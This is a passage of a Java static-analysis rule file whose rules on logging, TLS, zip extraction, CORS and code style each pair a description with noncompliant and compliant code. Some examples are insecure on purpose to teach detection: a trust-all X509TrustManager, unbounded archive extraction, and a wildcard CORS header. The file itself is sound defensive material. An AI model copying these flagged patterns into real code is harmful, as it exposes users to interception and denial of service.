            &lt;li&gt; the logs contain sensitive information on a production server. This can happen when the logger is
            in debug mode. &lt;/li&gt;
            &lt;li&gt; the log can grow without limit. This can happen when additional information is written into logs
            every time a user performs an action and the
            user can perform the action as many times as he/she wants. &lt;/li&gt;
            &lt;li&gt; the logs do not contain enough information to understand the damage an attacker might have
            inflicted. The loggers mode (info, warn, error)
            might filter out important information. They might not print contextual information like the precise time of
            events or the server hostname. &lt;/li&gt;
            &lt;li&gt; the logs are only stored locally instead of being backuped or replicated. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; Check that your production deployment doesn't have its loggers in &quot;debug&quot; mode as it
            might write sensitive information in logs. &lt;/li&gt;
            &lt;li&gt; Production logs should be stored in a secure location which is only accessible to system
            administrators. &lt;/li&gt;
            &lt;li&gt; Configure the loggers to display all warnings, info and error messages. Write relevant
            information such as the precise time of events and the
            hostname. &lt;/li&gt;
            &lt;li&gt; Choose log format which is easy to parse and process automatically. It is important to process
            logs rapidly in case of an attack so that the
            impact is known and limited. &lt;/li&gt;
            &lt;li&gt; Check that the permissions of the log files are correct. If you index the logs in some other
            service, make sure that the transfer and the
            service are secure too. &lt;/li&gt;
            &lt;li&gt; Add limits to the size of the logs and make sure that no user can fill the disk with logs. This
            can happen even when the user does not control
            the logged information. An attacker could just repeat a logged action many times. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Remember that configuring loggers properly doesn't make them bullet-proof. Here is a list of
            recommendations explaining on how to use your
            logs:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; Don't log any sensitive information. This obviously includes passwords and credit card numbers
            but also any personal information such as user
            names, locations, etc... Usually any information which is protected by law is good candidate for removal.
            &lt;/li&gt;
            &lt;li&gt; Sanitize all user inputs before writing them in the logs. This includes checking its size,
            content, encoding, syntax, etc... As for any user
            input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can
            have many impacts. It could for example
            use all your storage space or compromise your log indexing service. &lt;/li&gt;
            &lt;li&gt; Log enough information to monitor suspicious activities and evaluate the impact an attacker might
            have on your systems. Register events such as
            failed logins, successful logins, server side input validation failures, access denials and any important
            transaction. &lt;/li&gt;
            &lt;li&gt; Monitor the logs for any suspicious activity. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;p&gt;This rule supports the following libraries: Log4J, &lt;code&gt;java.util.logging&lt;/code&gt; and
            Logback&lt;/p&gt;
            &lt;pre&gt;
            // === Log4J 2 ===
            import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilderFactory;
            import org.apache.logging.log4j.Level;
            import org.apache.logging.log4j.core.*;
            import org.apache.logging.log4j.core.config.*;

            // Sensitive: creating a new custom configuration
            abstract class CustomConfigFactory extends ConfigurationFactory {
            // ...
            }

            class A {
            void foo(Configuration config, LoggerContext context, java.util.Map&amp;lt;String, Level&amp;gt; levelMap,
            Appender appender, java.io.InputStream stream, java.net.URI uri,
            java.io.File file, java.net.URL url, String source, ClassLoader loader, Level level, Filter filter)
            throws java.io.IOException {
            // Creating a new custom configuration
            ConfigurationBuilderFactory.newConfigurationBuilder(); // Sensitive

            // Setting loggers level can result in writing sensitive information in production
            Configurator.setAllLevels(&quot;com.example&quot;, Level.DEBUG); // Sensitive
            Configurator.setLevel(&quot;com.example&quot;, Level.DEBUG); // Sensitive
            Configurator.setLevel(levelMap); // Sensitive
            Configurator.setRootLevel(Level.DEBUG); // Sensitive

            config.addAppender(appender); // Sensitive: this modifies the configuration

            LoggerConfig loggerConfig = config.getRootLogger();
            loggerConfig.addAppender(appender, level, filter); // Sensitive
            loggerConfig.setLevel(level); // Sensitive

            context.setConfigLocation(uri); // Sensitive

            // Load the configuration from a stream or file
            new ConfigurationSource(stream); // Sensitive
            new ConfigurationSource(stream, file); // Sensitive
            new ConfigurationSource(stream, url); // Sensitive
            ConfigurationSource.fromResource(source, loader); // Sensitive
            ConfigurationSource.fromUri(uri); // Sensitive
            }
            }
            &lt;/pre&gt;
            &lt;pre&gt;
            // === java.util.logging ===
            import java.util.logging.*;

            class M {
            void foo(LogManager logManager, Logger logger, java.io.InputStream is, Handler handler)
            throws SecurityException, java.io.IOException {
            logManager.readConfiguration(is); // Sensitive

            logger.setLevel(Level.FINEST); // Sensitive
            logger.addHandler(handler); // Sensitive
            }
            }
            &lt;/pre&gt;
            &lt;pre&gt;
            // === Logback ===
            import ch.qos.logback.classic.util.ContextInitializer;
            import ch.qos.logback.core.Appender;
            import ch.qos.logback.classic.joran.JoranConfigurator;
            import ch.qos.logback.classic.spi.ILoggingEvent;
            import ch.qos.logback.classic.*;

            class M {
            void foo(Logger logger, Appender&amp;lt;ILoggingEvent&amp;gt; fileAppender) {
            System.setProperty(ContextInitializer.CONFIG_FILE_PROPERTY, &quot;config.xml&quot;); // Sensitive
            JoranConfigurator configurator = new JoranConfigurator(); // Sensitive

            logger.addAppender(fileAppender); // Sensitive
            logger.setLevel(Level.DEBUG); // Sensitive
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Log4J 1.x is not covered as it has reached &lt;a href=&quot;https://blogs.apache.org/foundation/entry/apache_logging_services_project_announces&quot;&gt;end
            of
            life&lt;/a&gt;.&lt;/p&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure&quot;&gt;OWASP
            Top 10 2017 Category A3&lt;/a&gt; - Sensitive Data Exposure
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring&quot;&gt;OWASP
            Top 10 2017 Category A10&lt;/a&gt; -
            Insufficient Logging &amp;amp; Monitoring &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/532.html&quot;&gt;MITRE, CWE-532&lt;/a&gt;
            - Information Exposure Through Log Files &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/117.html&quot;&gt;MITRE, CWE-117&lt;/a&gt;
            - Improper Output Neutralization for Logs &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/778.html&quot;&gt;MITRE, CWE-778&lt;/a&gt;
            - Insufficient Logging &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat3&quot;&gt;SANS Top 25&lt;/a&gt;
            - Porous Defenses &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a10</tag>
        <tag>owasp-a3</tag>
        <tag>sans-top25-porous</tag>
        <securityStandards>
            <cwe>532,117,778</cwe>
            <OWASP>A3,A10</OWASP>
        </securityStandards>
    </rule>

    <rule key='S4830' priority='CRITICAL'>
        <configKey>S4830</configKey>
        <name>Server certificates should be verified during SSL/TLS connections</name>
        <description>
            &lt;p&gt;Validation of X.509 certificates is essential to create secure SSL/TLS sessions not vulnerable to
            man-in-the-middle attacks. &lt;/p&gt;
            &lt;p&gt;The certificate chain validation includes these steps:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; The certificate is issued by its parent Certificate Authority or the root CA trusted by the
            system. &lt;/li&gt;
            &lt;li&gt; Each CA is allowed to issue certificates. &lt;/li&gt;
            &lt;li&gt; Each certificate in the chain is not expired. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;This rule raises an issue when an implementation of X509TrustManager is not controlling the
            validity of the certificate (ie: no exception is
            raised). Empty implementations of the &lt;code&gt;X509TrustManager&lt;/code&gt; interface are often created
            to disable certificate validation. The correct
            solution is to provide an appropriate trust store.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            class TrustAllManager implements X509TrustManager {

            @Override
            public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException { //
            Noncompliant, nothing means trust any client
            }

            @Override
            public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException { //
            Noncompliant, this method never throws exception, it means trust any server
            LOG.log(Level.SEVERE, ERROR_MESSAGE);
            }

            @Override
            public X509Certificate[] getAcceptedIssuers() {
            return null;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration&quot;&gt;OWASP
            Top 10 2017 Category A6&lt;/a&gt; - Security
            Misconfiguration &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/295.html&quot;&gt;MITRE, CWE-295&lt;/a&gt;
            - Improper Certificate Validation &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/hDdGBQ&quot;&gt;CERT, MSC61-J.&lt;/a&gt; -
            Do not use insecure or weak cryptographic algorithms &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>owasp-a3</tag>
        <tag>owasp-a6</tag>
        <tag>privacy</tag>
        <tag>ssl</tag>
        <securityStandards>
            <OWASP>A3,A6</OWASP>
        </securityStandards>
    </rule>

    <rule key='S4838' priority='MINOR'>
        <configKey>S4838</configKey>
        <name>An iteration on a Collection should be performed on the type handled by the Collection</name>
        <description>
            &lt;p&gt;This rule raises an issue when an iteration over the items of a &lt;code&gt;Collection&lt;/code&gt;
            is performed on a super-type of the type handled by the
            &lt;code&gt;Collection&lt;/code&gt;.&lt;/p&gt;
            &lt;p&gt;Relying on &lt;code&gt;Object&lt;/code&gt; or any classes between &lt;code&gt;Object&lt;/code&gt;
            and the real class handled by the &lt;code&gt;Collection&lt;/code&gt; is not
            recommended. While it's accepted by the language, this practice reduces readability of the code and forces
            to down-cast the item of the
            &lt;code&gt;Collection&lt;/code&gt; to be able to call a method on it while simply using the correct type in
            the iteration makes things more clear and simple.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public Collection&amp;lt;Person&amp;gt; getPersons() { ... }

            for (Object item : getPersons()) { // Noncompliant
            Person person = (Person) item; // Noncompliant; it's required to down-cast to the to correct type to use
            &quot;item&quot;
            person.getAdress();
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            for (Person person : getPersons()) { // Compliant
            person.getAddress() ;
            }
            &lt;/pre&gt;
        </description>
        <tag>bad-practice</tag>
        <tag>clumsy</tag>
    </rule>

    <rule key='S4925' priority='MAJOR'>
        <configKey>S4925</configKey>
        <name>&quot;Class.forName()&quot; should not load JDBC 4.0+ drivers</name>
        <description>
            &lt;p&gt;In the past, it was required to load a JDBC driver before creating a &lt;code&gt;java.sql.Connection&lt;/code&gt;.
            Nowadays, when using JDBC 4.0 drivers, this
            is no longer required and &lt;code&gt;Class.forName()&lt;/code&gt; can be safely removed because JDBC 4.0
            (JDK 6) drivers available in the classpath are
            automatically loaded.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when &lt;code&gt;Class.forName()&lt;/code&gt; is used with one of the
            following values:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;com.mysql.jdbc.Driver&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;oracle.jdbc.driver.OracleDriver&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;com.ibm.db2.jdbc.app.DB2Driver&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;com.ibm.db2.jdbc.net.DB2Driver&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;com.sybase.jdbc.SybDriver&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;com.sybase.jdbc2.jdbc.SybDriver&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;com.teradata.jdbc.TeraDriver&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;com.microsoft.sqlserver.jdbc.SQLServerDriver&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;org.postgresql.Driver&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;sun.jdbc.odbc.JdbcOdbcDriver&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;org.hsqldb.jdbc.JDBCDriver&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;org.h2.Driver&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;org.firebirdsql.jdbc.FBDriver&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;net.sourceforge.jtds.jdbc.Driver&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;com.ibm.db2.jcc.DB2Driver&lt;/code&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            import java.sql.Connection;
            import java.sql.DriverManager;
            import java.sql.SQLException;

            public class Demo {
            private static final String DRIVER_CLASS_NAME = &quot;org.postgresql.Driver&quot;;
            private final Connection connection;

            public Demo(String serverURI) throws SQLException, ClassNotFoundException {
            Class.forName(DRIVER_CLASS_NAME); // Noncompliant; no longer required to load the JDBC Driver using
            Class.forName()
            connection = DriverManager.getConnection(serverURI);
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            import java.sql.Connection;
            import java.sql.DriverManager;
            import java.sql.SQLException;

            public class Demo {
            private final Connection connection;

            public Demo(String serverURI) throws SQLException {
            connection = DriverManager.getConnection(serverURI);
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>obsolete</tag>
    </rule>

    <rule key='S4929' priority='MINOR'>
        <configKey>S4929</configKey>
        <name>&quot;read(byte[],int,int)&quot; should be overridden</name>
        <description>
            &lt;p&gt;When directly subclassing &lt;code&gt;java.io.InputStream&lt;/code&gt; or &lt;code&gt;java.io.FilterInputStream&lt;/code&gt;,
            the only requirement is that you implement
            the method &lt;code&gt;read()&lt;/code&gt;. However most uses for such streams don't read a single byte at a
            time and the default implementation for
            &lt;code&gt;read(byte[],int,int)&lt;/code&gt; will call &lt;code&gt;read(int)&lt;/code&gt; for every single
            byte in the array which can create a lot of overhead and is
            utterly inefficient. It is therefore strongly recommended that subclasses provide an efficient
            implementation of
            &lt;code&gt;read(byte[],int,int)&lt;/code&gt;.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when a direct subclass of &lt;code&gt;java.io.InputStream&lt;/code&gt; or
            &lt;code&gt;java.io.FilterInputStream&lt;/code&gt; doesn't provide an
            override of &lt;code&gt;read(byte[],int,int)&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyInputStream extends java.io.InputStream {
            private FileInputStream fin;

            public MyInputStream(File file) throws IOException {
            fin = new FileInputStream(file);
            }

            @Override
            public int read() throws IOException {
            return fin.read();
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class MyInputStream extends java.io.InputStream {
            private FileInputStream fin;

            public MyInputStream(File file) throws IOException {
            fin = new FileInputStream(file);
            }

            @Override
            public int read() throws IOException {
            return fin.read();
            }

            @Override
            public int read(byte[] b, int off, int len) throws IOException {
            return fin.read(b, off, len);
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;This rule doesn't raise an issue when the class is declared &lt;code&gt;abstract&lt;/code&gt;.&lt;/p&gt;
        </description>
        <tag>performance</tag>
    </rule>

    <rule key='S4970' priority='CRITICAL'>
        <configKey>S4970</configKey>
        <name>Derived exceptions should not hide their parents' catch blocks</name>
        <description>
            &lt;p&gt;The &lt;code&gt;catch&lt;/code&gt; block of a checked exception &quot;E&quot; may be hidden because
            the corresponding &lt;code&gt;try&lt;/code&gt; block only throws exceptions
            derived from E.&lt;/p&gt;
            &lt;p&gt;These derived exceptions are handled in dedicated &lt;code&gt;catch&lt;/code&gt; blocks prior to
            the &lt;code&gt;catch&lt;/code&gt; block of the base exception E. &lt;/p&gt;
            &lt;p&gt;The &lt;code&gt;catch&lt;/code&gt; block of E is unreachable and should be considered dead code. It
            should be removed, or the entire try-catch structure should
            be refactored.&lt;/p&gt;
            &lt;p&gt;It is also possible that a single exception type in a multi-catch block may be hidden while the
            catch block itself is still reachable. In that case
            it is enough to only remove the hidden exception type or to replace it with another type.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class HiddenCatchBlock {

            public static class CustomException extends Exception {
            }

            public static class CustomDerivedException extends CustomException {
            }

            public static void main(String[] args) {
            try {
            throwCustomDerivedException();
            } catch(CustomDerivedException e) {
            // ...
            } catch(CustomException e) { // Noncompliant; this code is unreachable
            // ...
            }
            }

            private static void throwCustomDerivedException() throws CustomDerivedException {
            throw new CustomDerivedException();
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class HiddenCatchBlock {

            public static class CustomException extends Exception {
            }

            public static class CustomDerivedException extends CustomException {
            }

            public static void main(String[] args) {
            try {
            throwCustomDerivedException();
            } catch(CustomDerivedException e) { // Compliant; try-catch block is &quot;catching&quot; only the Exception
            that can be thrown in the &quot;try&quot;
            //...
            }
            }
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S4973' priority='MAJOR'>
        <configKey>S4973</configKey>
        <name>Strings and Boxed types should be compared using &quot;equals()&quot;</name>
        <description>
            &lt;p&gt;It's almost always a mistake to compare two instances of &lt;code&gt;java.lang.String&lt;/code&gt;
            or boxed types like &lt;code&gt;java.lang.Integer&lt;/code&gt; using
            reference equality &lt;code&gt;==&lt;/code&gt; or &lt;code&gt;!=&lt;/code&gt;, because it is not comparing
            actual value but locations in memory.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            String firstName = getFirstName(); // String overrides equals
            String lastName = getLastName();

            if (firstName == lastName) { ... }; // Non-compliant; false even if the strings have the same value
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            String firstName = getFirstName();
            String lastName = getLastName();

            if (firstName != null &amp;amp;&amp;amp; firstName.equals(lastName)) { ... };
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/595.html&quot;&gt;MITRE, CWE-595&lt;/a&gt;
            - Comparison of Object References Instead of Object Contents &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/597.html&quot;&gt;MITRE, CWE-597&lt;/a&gt;
            - Use of Wrong Operator in String Comparison &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/UjdGBQ&quot;&gt;CERT, EXP03-J.&lt;/a&gt; -
            Do not use the equality operators when comparing values of boxed
            primitives &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/yDdGBQ&quot;&gt;CERT, EXP50-J.&lt;/a&gt; -
            Do not confuse abstract object equality with reference equality
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
    </rule>

    <rule key='S4977' priority='MINOR'>
        <configKey>S4977</configKey>
        <name>Type parameters should not shadow other type parameters</name>
        <description>
            &lt;p&gt;Shadowing makes it impossible to use the type parameter from the outer scope. Also, it can be
            confusing to distinguish which type parameter is
            being used.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when a type parameter from an inner scope uses the same name as one in an
            outer scope.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class TypeParameterHidesAnotherType&amp;lt;T&amp;gt; {

            public class Inner&amp;lt;T&amp;gt; { // Noncompliant
            //...
            }

            private &amp;lt;T&amp;gt; T method() { // Noncompliant
            return null;
            }

            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class NoTypeParameterHiding&amp;lt;T&amp;gt; {

            public class Inner&amp;lt;S&amp;gt; { // Compliant
            List&amp;lt;S&amp;gt; listOfS;
            }

            private &amp;lt;V&amp;gt; V method() { // Compliant
            return null;
            }

            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S5042' priority='CRITICAL'>
        <configKey>S5042</configKey>
        <name>Expanding archive files without controlling resource consumption is security-sensitive</name>
        <description>
            &lt;p&gt;Successful Zip Bomb attacks occur when an application expands untrusted archive files without
            controlling the size of the expanded data, which can
            lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed
            data but turned into gigabytes of
            uncompressed data. To achieve this extreme &lt;a href=&quot;https://en.wikipedia.org/wiki/Data_compression_ratio&quot;&gt;compression
            ratio&lt;/a&gt;, attackers will
            compress irrelevant data (eg: a long string of repeated bytes). &lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;p&gt;Archives to expand are untrusted and:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; There is no validation of the number of entries in the archive. &lt;/li&gt;
            &lt;li&gt; There is no validation of the total size of the uncompressed data. &lt;/li&gt;
            &lt;li&gt; There is no validation of the ratio between the compressed and uncompressed archive entry. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; Define and control the ratio between compressed and uncompressed data, in general the data
            compression ratio for most of the legit archives is
            1 to 3. &lt;/li&gt;
            &lt;li&gt; Define and control the threshold for maximum total size of the uncompressed data. &lt;/li&gt;
            &lt;li&gt; Count the number of file entries extracted from the archive and abort the extraction if their
            number is greater than a predefined threshold, in
            particular it's not recommended to recursively expand archives (an entry of an archive could be also an
            archive). &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;pre&gt;
            File f = new File(&quot;ZipBomb.zip&quot;);
            ZipFile zipFile = new ZipFile(f);
            Enumeration&amp;lt;? extends ZipEntry&amp;gt; entries = zipFile.entries(); // Sensitive

            while(entries.hasMoreElements()) {
            ZipEntry ze = entries.nextElement();
            File out = new File(&quot;./output_onlyfortesting.txt&quot;);
            Files.copy(zipFile.getInputStream(ze), out.toPath(), StandardCopyOption.REPLACE_EXISTING);
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;Do not rely on &lt;a href=&quot;https://docs.oracle.com/javase/7/docs/api/java/util/zip/ZipEntry.html#getSize()&quot;&gt;getsize&lt;/a&gt;
            to retrieve the size of an
            uncompressed entry because this method returns what is defined in the archive headers which can be forged by
            attackers, instead calculate the actual
            entry size when unzipping it:&lt;/p&gt;
            &lt;pre&gt;
            File f = new File(&quot;ZipBomb.zip&quot;);
            ZipFile zipFile = new ZipFile(f);
            Enumeration&amp;lt;? extends ZipEntry&amp;gt; entries = zipFile.entries();

            int THRESHOLD_ENTRIES = 10000;
            int THRESHOLD_SIZE = 1000000000; // 1 GB
            double THRESHOLD_RATIO = 10;
            int totalSizeArchive = 0;
            int totalEntryArchive = 0;

            while(entries.hasMoreElements()) {
            ZipEntry ze = entries.nextElement();
            InputStream in = new BufferedInputStream(zipFile.getInputStream(ze));
            OutputStream out = new BufferedOutputStream(new FileOutputStream(&quot;./output_onlyfortesting.txt&quot;));

            totalEntryArchive ++;

            int nBytes = -1;
            byte[] buffer = new byte[2048];
            int totalSizeEntry = 0;

            while((nBytes = in.read(buffer)) &amp;gt; 0) { // Compliant
            out.write(buffer, 0, nBytes);
            totalSizeEntry += nBytes;
            totalSizeArchive += nBytes;

            double compressionRatio = totalSizeEntry / ze.getCompressedSize();
            if(compressionRatio &amp;gt; THRESHOLD_RATIO) {
            // ratio between compressed and uncompressed data is highly suspicious, looks like a Zip Bomb Attack
            break;
            }
            }

            if(totalSizeArchive &amp;gt; THRESHOLD_SIZE) {
            // the uncompressed data size is too much for the application resource capacity
            break;
            }

            if(totalEntryArchive &amp;gt; THRESHOLD_ENTRIES) {
            // too much entries in this archive, can lead to inodes exhaustion of the system
            break;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration&quot;&gt;OWASP
            Top 10 2017 Category A6&lt;/a&gt; -
            Security Misconfiguration &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/409.html&quot;&gt;MITRE, CWE-409&lt;/a&gt;
            - Improper Handling of Highly Compressed Data (Data Amplification)
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/display/java/IDS04-J.+Safely+extract+files+from+ZipInputStream&quot;&gt;CERT,
            IDS04-J.&lt;/a&gt; - Safely
            extract files from ZipInputStream &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.bamsoftware.com/hacks/zipbomb/&quot;&gt;bamsoftware.com&lt;/a&gt; -
            A better Zip Bomb &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>owasp-a5</tag>
        <tag>owasp-a6</tag>
        <securityStandards>
            <cwe>409</cwe>
            <OWASP>A5,A6</OWASP>
        </securityStandards>
    </rule>

    <rule key='S5122' priority='MINOR'>
        <configKey>S5122</configKey>
        <name>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive</name>
        <description>
            &lt;p&gt;Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the
            past to the following vulnerabilities:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0269&quot;&gt;CVE-2018-0269&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14460&quot;&gt;CVE-2017-14460&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy&quot;&gt;Same
            origin policy&lt;/a&gt; in browsers prevents, by default and for
            security-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a
            different origin (domain, protocol, or port)
            from its own. The requested target can append additional HTTP headers in response, called &lt;a
            href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS&quot;&gt;CORS&lt;/a&gt;, that act like
            directives for the browser and change the access control policy
            / relax the same origin policy.&lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; You don't trust the origin specified, example: &lt;code&gt;Access-Control-Allow-Origin:
            untrustedwebsite.com&lt;/code&gt;. &lt;/li&gt;
            &lt;li&gt; Access control policy is entirely disabled: &lt;code&gt;Access-Control-Allow-Origin: *&lt;/code&gt;
            &lt;/li&gt;
            &lt;li&gt; Your access control policy is dynamically defined by a user-controlled input like &lt;a
            href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin&quot;&gt;&lt;code&gt;origin&lt;/code&gt;&lt;/a&gt;
            header. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; The &lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt; header should be set only for a trusted
            origin and for specific resources. &lt;/li&gt;
            &lt;li&gt; Allow only selected, trusted domains in the &lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt;
            header. Prefer whitelisting domains over blacklisting or
            allowing any domain (do not use * wildcard nor blindly return the &lt;code&gt;Origin&lt;/code&gt; header
            content without any checks). &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;p&gt;Java servlet framework:&lt;/p&gt;
            &lt;pre&gt;
            @Override
            protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException
            {
            resp.setHeader(&quot;Content-Type&quot;, &quot;text/plain; charset=utf-8&quot;);
            resp.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;); // Sensitive
            resp.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);
            resp.setHeader(&quot;Access-Control-Allow-Methods&quot;, &quot;GET&quot;);
            resp.getWriter().write(&quot;response&quot;);
            }
            &lt;/pre&gt;
            &lt;p&gt;Spring MVC framework:&lt;/p&gt;
            &lt;p&gt;&lt;a
